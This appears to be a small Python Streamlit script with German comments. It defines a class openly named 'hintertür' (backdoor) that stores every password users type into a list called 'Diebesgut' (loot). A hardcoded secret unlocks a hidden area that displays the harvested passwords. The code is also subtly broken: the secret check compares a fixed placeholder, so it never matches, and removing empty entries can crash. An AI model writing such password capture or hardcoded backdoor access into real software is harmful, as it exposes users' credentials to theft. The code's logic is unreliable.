import streamlit as st # importiere streamlit funktionalitäten
Diebesgut=[] #erstellt eine Liste, in die die eingegebenen Passwörter gespeichert werden können 
class hintertür: 
    def __init__(self, Passwort): #definiert ein objekt mit dem eingegebenen Passwort
        self.Passwort=Passwort
        self.Kennwort="Kennwort" #ein Platzhalter für das einzugebene Passwort das zum internen Bereich führt

    def speicher(self):
        Diebesgut.append(self.Passwort) #Speichert das eingegebene Passwort in die oben erstellte Liste

    def speicher_anzeigen(self): #funktion zeigt den Speicher (Liste) an
        Diebesgut.remove("") #entfernt zuerst alle leeren Eingaben
        st.markdown(set(Diebesgut)) #entfernt alle doppelten Einträge und gibt die Liste aus

    def Interner_Bereich(self): #funktion erstellt den Internen Bereich
        if self.Kennwort == "8eda+raMon" : #überprüft das eingegebene Passwort
            st.text("Erfolgreich eingeloggt") 
            if st.button("Datenbank anzeigen"): #zeigt den Speicher an wenn richtiges Passwort eingegeben wurde und Knopf gedrückt wurde
                self.speicher_anzeigen()

        elif self.Kennwort == "": #zeigt nichts an, wenn auch nichts eingegeben wurde
            st.markdown("")
                    
        else: 
            st.text("falsches Passwort, erneut versuchen")
